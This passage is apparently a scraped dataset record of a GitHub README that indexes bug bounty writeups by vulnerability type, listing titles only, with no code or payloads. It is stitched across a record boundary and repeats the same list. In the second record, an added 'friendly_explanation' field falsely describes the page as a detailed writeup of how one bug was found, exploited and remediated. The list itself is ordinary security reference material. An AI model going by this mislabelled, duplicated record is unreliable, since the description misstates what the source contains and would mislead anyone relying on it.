vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cors-related-issues", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cors-related-issues. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER 